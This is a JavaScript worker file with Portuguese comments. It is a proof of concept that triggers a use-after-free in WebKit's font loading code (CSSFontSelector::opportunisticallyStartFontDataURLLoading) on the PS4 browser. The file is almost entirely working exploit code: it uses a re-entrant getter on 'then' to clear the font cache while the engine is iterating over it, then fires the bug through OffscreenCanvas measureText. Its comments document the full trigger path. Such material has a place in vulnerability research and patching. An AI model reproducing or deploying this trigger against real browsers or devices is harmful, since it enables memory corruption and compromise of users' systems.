// UAF PoC — CSSFontSelector::opportunisticallyStartFontDataURLLoading
// Opcao 1: usa OffscreenCanvas transferido do main thread via postMessage
//
// Estrutura de arquivos necessaria:
//   index.html    <- abre no PS4
//   worker.js     <- este arquivo
//   font.woff     <- qualquer .woff pequeno (ex: Ahem.woff do WebKit test suite)
//
// Por que o Worker e necessario:
//   Em Workers, fontes com data: URL pequenas carregam SINCRONAMENTE.
//   Essa sincronicidade e o que permite a reentrada em m_cache durante
//   a iteracao de constituentFaces() — sem ela, o UAF nao ocorre.

// ---------------------------------------------------------------------------
// Passo 1: Carregar a fonte como data: URL usando APIs de Worker
// (XHR sincrono e FileReaderSync estao disponiveis apenas em Workers)
// ---------------------------------------------------------------------------
function fontDataURL(path) {
    var req = new XMLHttpRequest();
    req.open('GET', path, false); // false = sincrono
    req.responseType = 'arraybuffer';
    req.send();

    // FileReaderSync: versao sincrona do FileReader, Worker-only
    return new FileReaderSync().readAsDataURL(
        new Blob([req.response], { type: 'font/woff' })
    );
}

var dataUrl = fontDataURL('font.woff');

// ---------------------------------------------------------------------------
// Passo 2: Criar dois FontFaces com a mesma data: URL e registrar no worker
// Dois faces sao necessarios para que o loop de constituentFaces() tenha
// pelo menos duas iteracoes — o UAF acontece na segunda iteracao apos
// m_cache ser limpo na primeira
// ---------------------------------------------------------------------------
var face1 = new FontFace('testFace', 'url("' + dataUrl + '")');
var face2 = new FontFace('testFace', 'url("' + dataUrl + '")');
self.fonts.add(face1);
self.fonts.add(face2);

// Acessar .loaded popula a deferred Promise internamente no WebKit,
// tornando a resolucao observavel pelo mecanismo de thenable abaixo
void face1.loaded;
void face2.loaded;

// ---------------------------------------------------------------------------
// Passo 3: Instalar a armadilha de reentrada via getter em "then"
//
// Quando o WebKit resolve a Promise de FontFace.loaded durante
// opportunisticallyStartFontDataURLLoading, ele testa se o valor
// resolvido e "thenable" (duck-typing de Promise/A+) acessando .then.
// Esse acesso dispara o getter abaixo, que chama FontFaceSet.add(),
// que por sua vez limpa CSSFontFaceSet::m_cache.
// O CSSSegmentedFontFace que esta sendo iterado e destruido -> UAF.
// ---------------------------------------------------------------------------
var reenterFontFaceSet = function() {
    self.fonts.add(new FontFace('unrelated', 'local("nonexistent")'));
};
Object.defineProperty(face1, 'then', { get: reenterFontFaceSet });
Object.defineProperty(face2, 'then', { get: reenterFontFaceSet });

// ---------------------------------------------------------------------------
// Passo 4: Receber o OffscreenCanvas do main thread e acionar o UAF
// ---------------------------------------------------------------------------
self.onmessage = function(e) {
    var context = e.data.canvas.getContext('2d');

    // Configura a font cascade que referencia testFace como fallback
    // "Times" vai falhar para 0x13A0 (caractere Cherokee), forcando o
    // fallback para testFace e ativando opportunisticallyStartFontDataURLLoading
    context.font = '10px Times, testFace';

    // measureText dispara o caminho:
    //   CanvasRenderingContext2D::measureText()
    //     -> FontCascadeFonts::glyphDataForVariant()          (pre-warm hook)
    //       -> CSSFontSelector::opportunisticallyStartFontDataURLLoading()
    //         -> loop: for (auto& face : segmentedFontFace->constituentFaces())
    //           -> face->opportunisticallyStartFontDataURLLoading()
    //             -> data: URL carrega sincronamente
    //             -> resolve FontFace.loaded promise
    //             -> engine testa face.then (thenable check)
    //             -> getter dispara -> FontFaceSet.add() -> m_cache.clear()
    //             -> segmentedFontFace destruido
    //         -> proxima iteracao do loop: dangling reference -> UAF
    context.measureText(String.fromCharCode(0x13A0));

    postMessage('measureText() completou — verificar crash / kernel logs do PS4');
};
